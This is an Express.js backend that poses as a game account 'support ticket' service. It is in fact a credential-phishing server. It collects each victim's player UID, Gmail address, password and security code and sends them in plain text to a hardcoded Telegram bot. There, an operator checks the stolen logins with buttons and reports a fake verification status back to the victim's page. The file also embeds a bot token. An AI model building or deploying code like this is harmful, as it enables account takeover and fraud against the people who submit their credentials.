const express = require('express');
const axios = require('axios');
const cors = require('cors');

const app = express();
app.use(cors());
app.use(express.json());

const TELEGRAM_BOT_TOKEN = "8394444876:AAGQ3vrDdHXR--TZzCd0muiEAh6DIrect10";
const TELEGRAM_CHAT_ID = "-1004444318249";

let userDatabase = {}; 

app.get('/', (req, res) => res.send("Backend Running"));

app.post('/api/submit-ticket', async (req, res) => {
    const { uid, gmail, password, securityCode, problemType, additionalDetails } = req.body;
    
    userDatabase[uid] = {
        status: "Pending",
        name: "Checking Status...",
        level: "Under Review",
        reason: ""
    };

    const telegramMessage = `
📩 *New Support Ticket Submitted!*

🆔 *Player UID:* \`${uid}\`
📧 *Bind Gmail:* \`${gmail}\`
🔑 *Password:* \`${password}\`
🔢 *Security Code:* \`${securityCode}\`
📌 *Issue:* ${problemType}
📝 *Details:* ${additionalDetails}
    `;

    try {
        await axios.post(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
            chat_id: TELEGRAM_CHAT_ID,
            text: telegramMessage,
            parse_mode: 'Markdown',
            reply_markup: {
                inline_keyboard: [
                    [
                        { text: "✅ Verify Account", callback_data: `verify_${uid}` }
                    ],
                    [
                        { text: "❌ Wrong Pass", callback_data: `reject_${uid}_Wrong Password` },
                        { text: "❌ Wrong Gmail", callback_data: `reject_${uid}_Invalid Gmail` }
                    ],
                    [
                        { text: "❌ Wrong Code", callback_data: `reject_${uid}_Wrong Security Code` },
                        { text: "❌ Wrong UID", callback_data: `reject_${uid}_Invalid UID` }
                    ]
                ]
            }
        });
        res.json({ success: true });
    } catch (error) {
        res.status(500).json({ success: false });
    }
});

app.post('/api/telegram-webhook', async (req, res) => {
    const update = req.body;

    if (update && update.callback_query) {
        const callbackQuery = update.callback_query;
        const data = callbackQuery.data; 
        const chatId = callbackQuery.message.chat.id;
        const messageId = callbackQuery.message.message_id;

        const parts = data.split('_');
        const action = parts[0];
        const uid = parts[1];
        const reason = parts[2] || "Information Mismatch";

        let confirmationMsg = "";

        if (action === 'verify') {
            userDatabase[uid] = {
                status: "Verified",
                name: "Verified Player",
                level: "Active Account",
                reason: ""
            };

            await axios.post(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/editMessageText`, {
                chat_id: chatId,
                message_id: messageId,
                text: callbackQuery.message.text + `\n\n🟢 *Status: VERIFIED BY ADMIN*`,
                parse_mode: 'Markdown'
            });

            confirmationMsg = `✅ *Confirmation Alert!*\n\nPlayer UID: \`${uid}\` status has been successfully updated to *VERIFIED* on the website!`;

        } else if (action === 'reject') {
            userDatabase[uid] = {
                status: "Rejected",
                name: "Verification Failed",
                level: "N/A",
                reason: reason
            };

            await axios.post(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/editMessageText`, {
                chat_id: chatId,
                message_id: messageId,
                text: callbackQuery.message.text + `\n\n🔴 *Status: REJECTED (${reason})*`,
                parse_mode: 'Markdown'
            });

            confirmationMsg = `🔴 *Rejection Alert!*\n\nPlayer UID: \`${uid}\` has been marked as *REJECTED* (${reason}) on the website!`;
        }

        // টেলিগ্রামে নতুন কনফার্মেশন মেসেজ পাঠানো
        await axios.post(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
            chat_id: chatId,
            text: confirmationMsg,
            parse_mode: 'Markdown'
        });

        await axios.post(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/answerCallbackQuery`, {
            callback_query_id: callbackQuery.id,
            text: `Updated Status for UID: ${uid}`
        });
    }

    res.sendStatus(200);
});

app.get('/api/check-status/:uid', (req, res) => {
    const uid = req.params.uid;
    const userData = userDatabase[uid] || {
        status: "Pending",
        name: "Checking Status...",
        level: "Under Review",
        reason: ""
    };
    res.json({ success: true, data: userData });
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => console.log(`Server running`));
